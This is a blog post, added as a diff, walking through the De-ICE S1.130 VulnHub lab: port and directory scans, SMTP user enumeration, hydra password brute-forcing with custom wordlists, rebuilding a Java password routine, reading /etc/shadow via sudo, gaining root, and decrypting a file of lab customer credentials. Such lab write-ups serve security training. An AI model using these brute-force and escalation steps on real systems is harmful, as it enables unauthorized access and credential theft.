@@ -1,0 +1,466 @@
+---
+layout: post
+title: "DE-ICE-S1.130"
+date: 2015-05-14 15:34:52 +0200
+comments: true
+categories: [vulnhub, deice]
+---
+Image: [De-ICE: S1.130](https://www.vulnhub.com/entry/de-ice-s1130,11/)
+
+Nmap output:
+{% codeblock %}
+PORT    STATE  SERVICE  VERSION
+20/tcp  closed ftp-data
+21/tcp  open   ftp      vsftpd 2.0.4
+22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)
+25/tcp  open   smtp     Sendmail 8.13.7/8.13.7
+80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
+110/tcp open   pop3     Openwall popa3d
+143/tcp open   imap     UW imapd 2004.357
+443/tcp closed https
+MAC Address: 00:0C:29:53:2F:A3 (VMware)
+{% endcodeblock %}
+
+Dirb output:
+{% codeblock %}
+---- Scanning URL: http://192.168.1.20/ ----
++ http://192.168.1.20/cgi-bin/ (CODE:403|SIZE:296)
++ http://192.168.1.20/index.php (CODE:200|SIZE:1980)
++ http://192.168.1.20/index2.php (CODE:200|SIZE:563)
++ http://192.168.1.20/info.php (CODE:200|SIZE:37915)
++ http://192.168.1.20/~sysadmin (CODE:403|SIZE:416)
+{% endcodeblock %}
+
+There is nothing interesting for us except the sysadmin account. 
+
+Web page mentions customerserviceadmin@nosecbank.com email address. After a
+little trying, we found out the user account that exists:
+{% codeblock %}
+root@kali32:~# smtp-user-enum -M RCPT -t 192.168.1.20 -f root@slax.example.net -U -
+csadmin
+[CTRL+D]
+
+Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Mode ..................... RCPT
+Worker Processes ......... 5
+Usernames file ........... -
+Target count ............. 1
+Username count ........... 1
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............
+
+######## Scan started at Thu May  7 13:50:31 2015 #########
+192.168.1.20: csadmin exists
+######## Scan completed at Thu May  7 13:50:31 2015 #########
+1 results.
+
+1 queries in 2 seconds (0.5 queries / sec)
+{% endcodeblock %}
+
+We use hydra to crack user account successfully (ftp was the fastest way):
+{% codeblock %}
+root@kali32:~# hydra -l csadmin 192.168.1.20 ftp -P /usr/share/ncrack/top50000.pwd -V
+[21][ftp] host: 192.168.1.20   login: csadmin   password: rocker
+
+root@kali32:~# hydra -l csadmin 192.168.1.20 imap -P /usr/share/ncrack/top50000.pwd -V
+[143][imap] host: 192.168.1.20   login: csadmin   password: rocker
+
+root@kali32:~# hydra -l csadmin 192.168.1.20 ssh -P /usr/share/ncrack/top50000.pwd -V -t 4
+[22][ssh] host: 192.168.1.20   login: csadmin   password: rocker
+
+root@kali32:~# hydra -l csadmin 192.168.1.20 pop3 -P /usr/share/ncrack/top50000.pwd -V
+[110][pop3] host: 192.168.1.20   login: csadmin   password: rocker
+{% endcodeblock %}
+
+We log in as csadmin / rocker:
+{% codeblock %}
+csadmin@slax:~$ cat /etc/passwd
+root:x:0:0::/root:/bin/bash
+bin:x:1:1:bin:/bin:
+daemon:x:2:2:daemon:/sbin:
+adm:x:3:4:adm:/var/log:
+lp:x:4:7:lp:/var/spool/lpd:
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/:
+news:x:9:13:news:/usr/lib/news:
+uucp:x:10:14:uucp:/var/spool/uucppublic:
+operator:x:11:0:operator:/root:/bin/bash
+games:x:12:100:games:/usr/games:
+ftp:x:14:50::/home/ftp:
+smmsp:x:25:25:smmsp:/var/spool/clientmqueue:
+mysql:x:27:27:MySQL:/var/lib/mysql:/bin/bash
+rpc:x:32:32:RPC portmap user:/:/bin/false
+sshd:x:33:33:sshd:/:
+gdm:x:42:42:GDM:/var/state/gdm:/bin/bash
+pop:x:90:90:POP:/:
+nobody:x:99:99:nobody:/:
+sysadmin:x:1000:10:,,,:/home/sysadmin:/bin/bash
+dbadmin:x:1001:100:,,,:/home/dbadmin:/bin/bash
+sdadmin:x:1002:100:,,,:/home/sdadmin:/bin/bash
+csadmin:x:1003:100:,,,:/home/csadmin:/bin/bash
+{% endcodeblock %}
+
+In home directory, there is a clue how to get sdadmin's password:
+{% codeblock %}
+csadmin@slax:~$ cat mailserv_download/2010122014234.j12Gqo4H049241 
+To: csadmin@nosecbank.com
+CC: 
+Subject: My Son's Birthday
+Date: Mon, 20 Dec 2010 14:23:46 +0500
+Return-Path: <sdadmin@nosecbank.com>
+Delivered-To: csadmin:nosecbank.com@nosecbank.com
+Received: (qmail 20281 invoked from network); 20 Dec 2010 09:23:46 -0000
+X-Received: from network (192.168.1.123) by mailserv1-3.us6.service.com; 
+20 Dec 2010 09:23:46 -0000
+Received: from www.nosecbank.com (unknown [198.65.139.34]) by 
+srv5.us6.service.com (Postfix) with ESMTP id D98402459DD for 
+<csadmin@nosecbank.com>; Mon, 20 Dec 2010 09:23:46 +0000 (GMT)
+Message-Id: <2010122014234.j12Gqo4H049241@www.nosecbank.com>
+Mime-Version: 1.0
+Content-Type: multipart/alternative; 
+boundary="---=_NextPart_000_0000_02F24S11.FEPQRE80"
+X-Mailer: K-Mail; Build 1.0.5510
+Thread-Index: Qw2cWVmE3odZs3TqTTqFvS1e3lexms==
+Message: Hey Mark, I am curious if you would be free to come over and 
+visit for my son Donovin's birthday tomorrow after work.  I would also 
+appreciate if you brought Andy with you as well, because Donny 
+really enjoyed playing with him last time he was over.  I know its short 
+notice but he is turning 12 and it is special for both him and me. Let 
+me know if this works. Thanks!  -Paul
+{% endcodeblock %}
+
+Also there is a secord part of some algorithm:
+{% codeblock lang:c %}
+csadmin@slax:~$ strings mailserv_download/2010122216451.f81Ltw4R010211.part2 | egrep -o "([0-9][0-9].*)"
+24      int[] backLoop(int[] input){
+25      int ref=input.length;   w
+26      int a=input[1]; int b=input[ref-1];
+27      int ch=(a+b)/2; 
+28      for(int i=0;i<ref;i++){ 
+29      if(i%2==0) input[i]=(input[i]%check)+(ref+i);   
+30      else input[i]=(input[i]+ref+i);}        .
+31      return input;}  
+45      int[] loopProcess(int[] input){ 
+46      for(int i=0;i<input.length;i++){
+47      if(input[i]==40||input[i]==41) input[i]+=input.length;  
+48      else if(input[i]==45) input[i]+=20+i;}  
+49      return input;}  
+{% endcodeblock %}
+
+Using this information, we was able to crack the password:
+{% codeblock %}
+root@kali32:~# for i in {1..2000}; do echo donovin$i; echo Donovin$i; echo "$i"donovin; echo "$i"Donovin; done > wl
+root@kali32:~# hydra -l sdadmin 192.168.1.20 ftp -P wl 
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2015-05-08 06:12:57
+[DATA] max 16 tasks per 1 server, overall 64 tasks, 8000 login tries (l:1/p:8000), ~7 tries per task
+[DATA] attacking service ftp on port 21
+[21][ftp] host: 192.168.1.20   login: sdadmin   password: donovin1998
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2015-05-08 06:13:01
+{% endcodeblock %}
+
+We log in as sdadmin / donovin1998 and repeat the process:
+{% codeblock lang:c %}
+sdadmin@slax:~$ cat mailserv_download/2010122216451.f81Ltw4R010211.part3 | strings | egrep -o "([0-9][0-9].*)"
+32      int[] loopBack(int[] input){
+33      int ref=input.length/2; 
+34      int[] encNew =int[input.length+ref];
+35      int ch=0;
+36      for(int i=(ref/2);i<input.length;i++){  
+37      encNew[i]=input[ch]; ch++;}
+38      for(int i=0;i<encNew.length;i++){
+39      if(encNew[i]<=33) encNew[i]=33+(++ref*2);
+40      else if(encNew[i]>=126) encNew[i]=126-(--ref*2);
+41      else{   
+42      if(i%2==0) encNew[i]-=(i%3);
+43      else encNew[i]+=(i%2);}}
+44      return encNew;} I
+{% endcodeblock %}
+
+{% codeblock %}
+sdadmin@slax:~$ cat mailserv_download/2010122015043.j15Htu1H341102 
+To: sdadmin@nosecbank.com
+CC: 
+Subject: RE: My Son's Birthday
+Date: Mon, 20 Dec 2010 15:04:32 +0500
+Return-Path: <csadmin@nosecbank.com>
+Delived-To: sdadmin:nosecbank.com@nosecbank.com
+Received: (qmail 20281 invoked from network); 20 Dec 2010 10:04:32 -0000
+X-Received: from network (192.168.1.123) by mailserv3-4.us6.service.com; 
+20 Dec 2010 10:04:32 -0000
+Received: from www.nosecbank.com (unknown [198.65.139.32]) by 
+srv3.us6.service.com (Postfix) with ESMTP id D98214787FD for 
+<csadmin@nosecbank.com; Mon, 20 Dec 2010 10:04:32 +0000 (GMT)
+Message-Id: <2010122015043.j15Htu1H341102@www.nosecbank.com>
+Mime-Version: 1.0
+Content-Type: multipart/alternative; 
+boundary="---=_NextPart_000_0000_05F11S20.FGHZWE49"
+X-Mailer: K-Mail; Build 1.0.5510
+Thread-Index: Aa5fqAwT8nsBe3T3T5q67a3Fd22XsZ==
+Message: Hey there Paul!  I would gladly bring myself and my son over 
+tomorrow after work!  I would only be hesitant to come over if you 
+invited Fred over too... He just freaks me out sometimes.  It doesnt 
+help that he locks himself up in his office and is anti-social during 
+lunch hours... On top of that he calls himself the "databaser"!  I mean, 
+who in thier right mind does that?  Either way, I will most likely be 
+there tomorrow.  I look forward to it!   -Mark
+{% endcodeblock %}
+
+So the dbadmin's password could be related with the word databaser:
+{% codeblock %}
+root@kali32:~# for i in {1..9999}; do echo databaser$i; echo "$i"databaser; echo Databaser$i; echo "$i"Databaser; done > wl
+root@kali32:~# hydra -l dbadmin 192.168.1.20 ftp -P wl 
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2015-05-08 06:21:55
+[DATA] max 16 tasks per 1 server, overall 64 tasks, 39996 login tries (l:1/p:39996), ~39 tries per task
+[DATA] attacking service ftp on port 21
+[21][ftp] host: 192.168.1.20   login: dbadmin   password: databaser60
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2015-05-08 06:21:55
+{% endcodeblock %}
+
+We extract the last part of the email and put everything together:
+{% codeblock lang:java %}
+1       /*input is username of account*/
+2       int[] processLoop(String input){
+3         int strL=input.length;  
+4         int lChar=(int)input.charAt(strL-1);
+5         int fChar=(int)input.charAt(0); 
+6         int[] encArr = int[strL+2];
+
+7         for(int i=0;i<strL+1;i++){
+8           encArr[i]=(int)input.charAt(i-1);}
+9           encArr[0]=(int)lChar;   
+10          encArr[encArr.length-1]=(int)fChar;
+11          encArr=backLoop(encArr);
+12          encArr=loopBack(encArr);
+13          encArr=loopProcesS(encArr);
+
+14          int j=encArr.length-1;  
+
+15          for(int i=0;i<encArr;i++){
+16            if(i==j) break; 
+17              int t=encArr[i];
+18              encArr[i]=encArr[j];
+19              encArr[j]=t;j--;}       
+20      return encArr;} 
+
+21      /*Note the pseudocode will be implemented with the 
+22      root account and my account, we still need to implement it with the csadmin, sdadmin,   
+23      and dbadmin accounts though*/   
+
+24      int[] backLoop(int[] input){
+25        int ref=input.length;   
+26        int a=input[1]; int b=input[ref-1];
+27        int ch=(a+b)/2;
+
+28        for(int i=0;i<ref;i++){
+29          if(i%2==0) input[i]=(input[i]%check)+(ref+i);
+30          else input[i]=(input[i]+ref+i);}
+31      return input;}
+
+32      int[] loopBack(int[] input){
+33        int ref=input.length/2; 
+34        int[] encNew =int[input.length+ref];
+35        int ch=0;
+
+36        for(int i=(ref/2);i<input.length;i++) { 
+37          encNew[i]=input[ch]; ch++;}
+38          for(int i=0;i<encNew.length;i++){
+39            if(encNew[i]<=33) encNew[i]=33+(++ref*2);
+40            else if(encNew[i]>=126) encNew[i]=126-(--ref*2);
+41            else{   
+42              if(i%2==0) encNew[i]-=(i%3);
+43              else encNew[i]+=(i%2);}}
+44      return encNew;}
+
+45      int[] loopProcess(int[] input) {
+46        for(int i=0;i<input.length;i++){
+47          if(input[i]==40||input[i]==41) input[i]+=input.length;
+48          else if(input[i]==45) input[i]+=20+i;}
+49      return input;}
+{% endcodeblock %}
+
+After fixing minor issues, we compile the code in Java:
+{% codeblock lang:java %}
+public class test {
+
+     /*input is username of account*/
+     static int[] processLoop(String input){
+       int strL=input.length();
+       int lChar=(int)input.charAt(strL-1);
+       int fChar=(int)input.charAt(0);
+       int[] encArr = new int[strL+2];
+
+       for(int i=1;i<strL+1;i++){
+         encArr[i]=(int)input.charAt(i-1);}
+         encArr[0]=(int)lChar;
+         encArr[encArr.length-1]=(int)fChar;
+         encArr=backLoop(encArr);
+         encArr=loopBack(encArr);
+         encArr=loopProcess(encArr);
+
+         int j=encArr.length-1;
+
+         for(int i=0;i<encArr.length;i++){
+           if(i==j) break;
+             int t=encArr[i];
+             encArr[i]=encArr[j];
+             encArr[j]=t;j--;}
+     return encArr;}
+
+     /*Note the pseudocode will be implemented with the 
+     root account and my account, we still need to implement it with the csadmin, sdadmin,   
+     and dbadmin accounts though*/
+
+     static int[] backLoop(int[] input){
+       int ref=input.length;
+       int a=input[1]; int b=input[ref-1];
+       int check=(a+b)/2;
+
+       for(int i=0;i<ref;i++){
+         if(i%2==0) input[i]=(input[i]%check)+(ref+i);
+         else input[i]=(input[i]+ref+i);}
+     return input;}
+
+     static int[] loopBack(int[] input){
+       int ref=input.length/2;
+       int[] encNew = new int[input.length+ref];
+       int ch=0;
+       for(int i=(ref/2);i<input.length;i++) {
+         encNew[i]=input[ch]; ch++;}
+         for(int i=0;i<encNew.length;i++){
+           if(encNew[i]<=33) encNew[i]=33+(++ref*2);
+           else if(encNew[i]>=126) encNew[i]=126-(--ref*2);
+           else{
+             if(i%2==0) encNew[i]-=(i%3);
+             else encNew[i]+=(i%2);}}
+     return encNew;}
+
+     static int[] loopProcess(int[] input) {
+       for(int i=0;i<input.length;i++){
+         if(input[i]==40||input[i]==41) input[i]+=input.length;
+         else if(input[i]==45) input[i]+=20+i;}
+     return input;}
+
+    public static void main(String[] args) {
+        int[] a = processLoop(args[0]);
+        for (int i=0; i<a.length; i++) {
+            System.out.print((char) a[i]);
+        }
+        System.out.println();
+    }
+}
+
+
+root@kali32:~# javac test.java 
+{% endcodeblock %}
+
+We encrypt another usernames to get passwords.
+{% codeblock %}
+{% raw %}
+root@kali32:~# java test sysadmin
+7531/{{tor/rv/A
+root@kali32:~# java test root
+31/Fwxw+2
+{% endraw %}
+{% endcodeblock %}
+ 
+Now we can log as sysadmin. Using sudo:
+{% codeblock %}
+User sysadmin may run the following commands on this host:
+    (root) NOEXEC: /bin/ls
+    (root) NOEXEC: /usr/bin/cat
+    (root) NOEXEC: /usr/bin/more
+    (root) NOEXEC: !/usr/bin/su *root*
+{% endcodeblock %}
+
+{% codeblock %}
+sysadmin@slax:~$ sudo cat /etc/shadow 
+root:$1$vEElgVNe$9nK8G715PgmFE4g1QyTII0:13553:0:::::
+bin:*:9797:0:::::
+daemon:*:9797:0:::::
+adm:*:9797:0:::::
+lp:*:9797:0:::::
+sync:*:9797:0:::::
+shutdown:*:9797:0:::::
+halt:*:9797:0:::::
+mail:*:9797:0:::::
+news:*:9797:0:::::
+uucp:*:9797:0:::::
+operator:*:9797:0:::::
+games:*:9797:0:::::
+ftp:*:9797:0:::::
+smmsp:*:9797:0:::::
+mysql:*:9797:0:::::
+rpc:*:9797:0:::::
+sshd:*:9797:0:::::
+gdm:*:9797:0:::::
+pop:*:9797:0:::::
+nobody:*:9797:0:::::
+sysadmin:$1$Nj4nHA2G$JbByYpmcxsXEiWAUObt1n0:13550:0:99999:7:::
+csadmin:$1$fL53QS96$x94h96zABA9MrbISq7VtZ1:13550:0:99999:7:::
+sdadmin:$1$hL8T9Cgk$0g4u8UgtkMn11OJ7sjsK00:13550:0:99999:7:::
+dbadmin:$1$dQwfzffm$kIXUGVFu3XZmm4jZNp6wa1:13550:0:99999:7:::
+{% endcodeblock %}
+
+Because we are in wheel group, we can invoke the command 'su' directly to obtain the root access:
+{% codeblock %}
+sysadmin@slax:~$ id
+uid=1000(sysadmin) gid=10(wheel) groups=10(wheel)
+sysadmin@slax:~$ su
+Password: *********
+root@slax:/home/sysadmin# 
+{% endcodeblock %}
+
+From the home directory of sysadmin user, we locate the encrypted file in ftp and use
+script for decryption, with the password of the root user:
+{% codeblock %}
+root@slax:~# cat /home/sysadmin/Note_to_self 
+Note:
+useracc_update.csv file has been moved to the ftp server and encrypted 
+for transfer to dbadmin's account.  These are only the updated values 
+for reference in the database.  
+We need to tailor to our new customers for the New Year!
+{% endcodeblock %}
+
+{% codeblock lang:bash %}
+root@slax:/home/ftp/incoming# cat crack-openssl.sh 
+#!/usr/bin/env bash
+
+mkdir csv
+ciphers=`openssl list-cipher-commands`
+
+for c in $ciphers; do
+  openssl enc -d -"$c" -in useracc_update.csv.enc -k "31/Fwxw+2" -out csv/useracc_update.csv.$c-decrypted 2>/dev/ull
+done
+strings -n 12 csv/*
+{% endcodeblock %}
+
+{% codeblock %}
+root@slax:/home/ftp/incoming# ./crack-openssl.sh   
+ID,Last,First,Email,State,Username,Password,Verifacation Code,Pin code
+1000,Carr,Alfred,acarr23@gmail.com,NY,acarr9096,phantom4,952733,490
+1001,Karson,William,wkarson53@yahoo.com,NY,wkarson2431,rockallday123,567094,345
+1002,Wheeler,Cordy,megawheels98@rocketmail.com,NY,cwheeler5031,goeagles90,462724,631
+1003,Smith,Ken,synthesizer_1r@gmail.com,NY,ksmith6253,crystalization,636721,353
+1004,Quinn,Cynthia,qcq92@aol.com,NY,cquinn1217,archyandhenry,680247,223
+1005,Floyd,Wilson,jukeboxer_4life@gmail.com,NY,wfloyd5931,knockout66,521456,441
+1006,Blake,Markus,sil3nt_gunn3r@yahoo.com,NY,mblake6947,268768924,129632,557
+1007,Nash,Jillian,wiselife141@aol.com,NY,jnash0934,checkitout1,324672,315
+1008,Atkins,Alison,double_a44@hotmail.com,NY,aatkins9087,gogogo123123,457094,124
+1009,Oliver,Frank,fog_of_war0001@gmail.com,NY,foliver9385,falconpunch,783143,134
+1010,Jones,Edith,msjones677@hotmail.com,NY,ejones7532,chris12345,632620,579
+1011,Moore,Cody,aiprojectx@gmail.com,NY,dot_Cipher,crypTrace,101010,1337
+{% endcodeblock %}
